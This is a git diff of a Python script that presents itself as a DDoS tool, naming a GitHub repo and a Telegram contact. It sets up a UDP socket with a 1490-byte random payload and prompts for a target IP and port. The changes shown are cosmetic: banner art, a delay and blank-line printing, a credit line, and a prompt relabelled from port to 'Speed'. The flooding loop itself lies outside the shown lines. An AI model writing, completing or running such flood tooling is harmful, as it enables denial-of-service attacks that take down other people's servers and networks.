@@ -5,6 +5,15 @@ import socket
 import random as r
 
 from datetime import datetime
+
+print("Wait.....")
+t.sleep(3)
+random_print = r.randint(37,100)
+for x in range(random_print):
+     print()
+     t.sleep(0.05)
+print(random_print)
+
 now = datetime.now()
 hour = now.hour
 minute = now.minute
@@ -16,19 +25,20 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = r._urandom(1490)
 
 print("""----------------------------------------------
-|       000 0       000 000     000 00       00
-|  0000   0 0  0000   0 0   000   0 0  00000  0
-|  00000  0 0  00000  0 0  00000  0 0        00
-|  00000  0 0  00000  0 0  00000  0 0000000   0
-|  0000   0 0  0000   0 0   000   0 0   000   0
-|        00 0        00 000     000 00       00
+0       000 0       000 000     000 00       00
+0  0000   0 0  0000   0 0   000   0 0  00000  0
+0  00000  0 0  00000  0 0  00000  0 0        00
+0  00000  0 0  00000  0 0  00000  0 0000000   0
+0  0000   0 0  0000   0 0   000   0 0   000   0
+0        00 0        00 000     000 00       00
 ----------- ----------- ----------- -----------""")
 print()
 print("github   : https://github.com/AndkCqX/DDOS-Cor-X-AndkCqX")
 print("Telegram : @AndkCq")
+print(" CQ or DrakMatter | From Cor X")
 print()
 ip = input("IP : ")
-port = int(input("端口 : "))
+port = int(input("Speed : "))
 os.system("clear")
 os.system("AndkCqX | Cor X")
 print("Starting......")
